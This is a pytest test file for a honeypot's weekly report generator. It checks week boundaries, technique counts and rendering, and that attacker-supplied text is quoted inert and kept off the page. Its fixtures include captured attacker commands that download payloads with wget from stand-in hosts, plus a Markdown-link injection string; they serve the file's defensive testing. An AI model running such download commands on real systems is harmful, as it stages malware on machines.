"""Tests for the weekly report.

What matters: the numbers are right, the week boundaries are right, no address
or command reaches the page, and attacker-chosen text cannot turn into
Markdown that does something.
"""

from __future__ import annotations

import os
import re
from collections import Counter
from datetime import UTC, date, datetime, timedelta

import pytest
from sqlalchemy.orm import Session

from honeypot_ai.attack.catalogue import load
from honeypot_ai.report.weekly import (
    Campaign,
    CapturedFile,
    Week,
    WeeklyData,
    gather,
    quote,
    render,
    technique_counts,
)

W45 = Week.parse("2026-W45")


# --- Weeks -------------------------------------------------------------------


def test_an_iso_week_runs_monday_to_monday_in_utc() -> None:
    assert W45.start == datetime(2026, 11, 2, tzinfo=UTC)
    assert W45.end == datetime(2026, 11, 9, tzinfo=UTC)
    assert W45.label == "2026-W45"
    assert W45.previous.label == "2026-W44"


def test_on_a_sunday_the_last_complete_week_is_the_one_before() -> None:
    sunday = datetime(2026, 11, 8, 18, 0, tzinfo=UTC)
    assert Week.last_complete(sunday).label == "2026-W44"
    assert Week.of(date(2026, 11, 8)) == W45


def test_the_year_boundary_follows_iso_rules() -> None:
    """29 December 2025 is a Monday in ISO week 1 of 2026."""
    assert Week.parse("2026-W01").start == datetime(2025, 12, 29, tzinfo=UTC)


# --- Quoting attacker text ------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("root", "`root`"),
        ("a`b", "`a'b`"),  # cannot close the code span
        ("a|b", "`a¦b`"),  # cannot split the table cell
        ("x\ny", "`x?y`"),
        ("", "*(empty)*"),
    ],
)
def test_attacker_text_is_quoted_inert(raw: str, expected: str) -> None:
    assert quote(raw) == expected


def test_a_markdown_link_in_a_password_stays_text() -> None:
    assert quote("[click](http://evil.example)", 64) == "`[click](http://evil.example)`"


def test_long_values_are_cut() -> None:
    assert quote("a" * 100) == "`" + "a" * 31 + "…`"


# --- Techniques -----------------------------------------------------------------


def test_each_session_counts_once_per_technique() -> None:
    sets = Counter({("authorized_keys_write", "ssh_dir_reset"): 10, ("payload_download",): 3})
    counts = technique_counts(sets, load())
    assert counts["T1098.004"] == 10  # two behaviours, one technique, ten sessions
    assert counts["T1105"] == 3


def test_a_behaviour_from_an_older_vocabulary_is_ignored_not_fatal() -> None:
    assert technique_counts(Counter({("no_longer_exists",): 5}), load()) == Counter()


# --- Rendering ------------------------------------------------------------------


def sample() -> WeeklyData:
    data = WeeklyData(
        week=W45,
        sessions=12_000,
        sessions_before=10_000,
        sources=800,
        countries=60,
        with_commands=3_000,
        new_sequences=95,
    )
    data.intents = Counter({"fingerprinting": 9_000, "staging": 2_000, "persistence": 1_000})
    data.intents_before = Counter({"fingerprinting": 9_500, "persistence": 500})
    data.behaviour_sets = Counter(
        {("payload_write", "base64_decode"): 40, ("host_enumeration",): 9}
    )
    data.behaviour_sets_before = Counter({("host_enumeration",): 7})
    data.campaigns = [
        Campaign(
            8_000,
            300,
            "fingerprinting",
            ("host_enumeration",),
            datetime(2026, 10, 1, tzinfo=UTC),
            True,
            1,
        ),
        Campaign(500, 2, "credential_access", (), datetime(2026, 11, 3, tzinfo=UTC), True, 0),
    ]
    data.top_countries = [("Netherlands", 4000)]
    data.top_networks = [("Example Hosting", 3000)]
    data.top_credentials = [("root", "admin|`x", 900)]
    data.files = [CapturedFile("ab" * 32, 4, 41, "trojan.mirai", "ELF")]
    data.both_labelled, data.agreed = 1000, 870
    data.disagreements = [("fingerprinting", "shell_probing", 80)]
    return data


def test_the_report_states_the_week_and_the_change() -> None:
    page = render(sample())
    assert page.startswith("# Honeypot weekly report, 2026-W45")
    assert "| Sessions | 12,000 | +20% |" in page
    assert "| staging | 2,000 | 16.7% | new |" in page


def test_techniques_new_this_week_are_marked() -> None:
    page = render(sample())
    assert re.search(
        r"\[T1105\]\(https://attack\.mitre\.org/techniques/T1105\).*\| 40 \| \*\*new\*\*", page
    )
    assert re.search(r"\[T1082\]\(.*\) System Information Discovery \| 9 \|  \|", page)


def test_campaigns_are_described_by_what_they_did() -> None:
    page = render(sample())
    assert "| 8,000 | 300 | fingerprinting | T1082 | 2026-10-01 |" in page
    assert "credential_access (no commands)" in page
    assert "2026-11-03 **new**" in page


def test_agreement_between_rules_and_model_is_reported() -> None:
    assert "they agree on 870 (87.0%)" in render(sample())


def test_attacker_text_in_the_report_is_quoted() -> None:
    assert "| `root` | `admin¦'x` | 900 |" in render(sample())


def test_mitres_attribution_closes_the_report() -> None:
    assert render(sample()).rstrip().endswith(load().attribution)


def test_an_empty_week_still_renders() -> None:
    page = render(WeeklyData(week=W45))
    assert "No sessions this week." in page
    assert "No technique was evidenced this week." in page


# --- Against the database ----------------------------------------------------------

TEST_DB = os.getenv("TEST_DATABASE_URL")
needs_db = pytest.mark.skipif(TEST_DB is None, reason="TEST_DATABASE_URL is not set")
IN_WEEK = W45.start + timedelta(days=2)


@pytest.fixture
def db():  # type: ignore[no-untyped-def]
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker

    from honeypot_ai.db import Base

    engine = create_engine(TEST_DB or "", future=True)
    Base.metadata.create_all(engine)
    maker = sessionmaker(bind=engine, expire_on_commit=False)
    with maker() as session:
        yield session
        session.rollback()
        for table in reversed(Base.metadata.sorted_tables):
            session.execute(table.delete())
        session.commit()


def add(
    db: Session,
    sid: str,
    ip: str,
    when: datetime,
    *commands: str,
    intent: str = "fingerprinting",
    behaviours: tuple[str, ...] = ("host_enumeration",),
    model: str | None = None,
) -> None:
    from honeypot_ai.classify.taxonomy import TAXONOMY_VERSION
    from honeypot_ai.db import CommandRow, SessionLabelRow, SessionRow

    db.add(
        SessionRow(
            session_id=sid,
            src_ip=ip,
            started_at=when,
            authenticated=True,
            command_count=len(commands),
        )
    )
    db.flush()
    for seq, command in enumerate(commands):
        db.add(CommandRow(session_id=sid, seq=seq, input=command, failed=False, occurred_at=when))
    db.add(
        SessionLabelRow(
            session_id=sid,
            classifier="rules",
            intent=intent,
            behaviours=list(behaviours),
            operator="automated",
            taxonomy_version=TAXONOMY_VERSION,
        )
    )
    if model:
        db.add(
            SessionLabelRow(
                session_id=sid,
                classifier="gemini:x",
                intent=model,
                behaviours=[],
                operator="automated",
                taxonomy_version=TAXONOMY_VERSION,
            )
        )
    db.commit()


@needs_db
def test_the_week_is_gathered_from_the_database(db) -> None:  # type: ignore[no-untyped-def]
    from honeypot_ai.db import LoginAttemptRow

    old = W45.start - timedelta(days=10)
    add(db, "old", "203.0.113.1", old, "uname -a")  # same sequence, seen before
    add(db, "a", "203.0.113.1", IN_WEEK, "uname -a", model="fingerprinting")
    add(db, "b", "203.0.113.2", IN_WEEK, "uname -a", model="shell_probing")
    add(
        db,
        "c",
        "198.51.100.3",
        IN_WEEK,
        "wget http://x/y",
        intent="staging",
        behaviours=("payload_download",),
    )
    add(db, "late", "203.0.113.9", W45.end + timedelta(hours=1), "nproc")  # next week
    db.add(
        LoginAttemptRow(
            session_id="a",
            seq=0,
            username="root",
            password="1234",
            succeeded=True,
            occurred_at=IN_WEEK,
        )
    )
    db.commit()

    data = gather(db, W45)

    assert data.sessions == 3
    assert data.sessions_before == 0
    assert data.sources == 3
    assert data.with_commands == 3
    assert data.new_sequences == 1  # wget; uname was seen before the week
    assert data.intents == Counter({"fingerprinting": 2, "staging": 1})
    assert data.campaigns[0].sessions == 2
    assert data.campaigns[0].first_seen == old
    assert data.top_credentials == [("root", "1234", 1)]
    assert (data.both_labelled, data.agreed) == (2, 1)
    assert data.disagreements == [("fingerprinting", "shell_probing", 1)]


@needs_db
def test_no_address_or_command_reaches_the_page(db) -> None:  # type: ignore[no-untyped-def]
    add(
        db,
        "a",
        "203.0.113.77",
        IN_WEEK,
        "wget http://198.51.100.200/bins/x.sh",
        intent="staging",
        behaviours=("payload_download",),
    )
    page = render(gather(db, W45))
    assert "203.0.113.77" not in page
    assert "198.51.100.200" not in page
    assert "wget" not in page


# --- The phone summary ------------------------------------------------------------


def test_the_summary_is_three_short_lines_of_aggregates() -> None:
    from honeypot_ai.report.weekly import summary

    lines = summary(sample()).splitlines()
    assert lines[0] == "12,000 sessions (+20%), 95 new command sequences."
    assert lines[1].startswith("New techniques: T1105 Ingress Tool Transfer, T1140")
    assert lines[2] == "1 file(s) captured for the first time."


def test_notify_refuses_to_run_without_a_topic(monkeypatch: pytest.MonkeyPatch) -> None:
    from honeypot_ai.report import __main__ as cli

    monkeypatch.delenv("NTFY_TOPIC", raising=False)
    assert cli.main(["weekly", "--notify"]) == 2
